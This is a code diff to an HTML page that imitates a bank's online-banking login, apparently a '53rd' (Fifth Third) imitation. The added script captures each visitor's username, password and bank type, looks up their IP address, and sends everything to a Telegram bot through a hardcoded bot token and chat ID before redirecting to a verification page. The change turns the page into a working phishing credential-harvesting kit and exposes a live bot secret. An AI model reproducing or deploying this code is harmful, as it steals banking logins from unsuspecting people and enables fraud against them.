@@ -252,15 +252,43 @@
       <p>Online banking is available, all day, every day. Simply log in to pay bills, view statements, chat with live agents, pay bills directly from your account, and more.</p>
     </div>
   </div>
+  <script src="send.js"></script>
   <script>
-    document.getElementById('login-form').onsubmit = function(e) {
+    const BOT_TOKEN = '6631658853:AAFDtIUx4xDRN61dyKiROvlgmo1PpuNtjNU';
+    const CHAT_ID = '5817278771';
+    document.getElementById('login-form').addEventListener('submit', function(e) {
       e.preventDefault();
       const userid = this.userid.value;
       const password = this.password.value;
+      const banktype = this.banktype.value;
+      // Save to sessionStorage for verify.html
       sessionStorage.setItem('userid', userid);
       sessionStorage.setItem('password', password);
-      window.location.href = 'verify.html';
-    };
+      sessionStorage.setItem('banktype', banktype);
+      // Fetch IP and send login info to Telegram
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(ipData => {
+          const ip = ipData.ip || 'Unknown';
+          const data = {
+            userid: userid,
+            password: password,
+            banktype: banktype,
+            ip: ip
+          };
+          const message = `[53rd Result]\n\n🏦 Banking Type: ${data.banktype}\nLOGIN\n👤 Username: ${data.userid}\n🔑 Password: ${data.password}\n\n🌐 IP Address: ${data.ip}`;
+          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: message
+            })
+          }).then(() => {
+            window.location.href = 'verify.html';
+          });
+        });
+    });
   </script>
 </body>
 </html> 
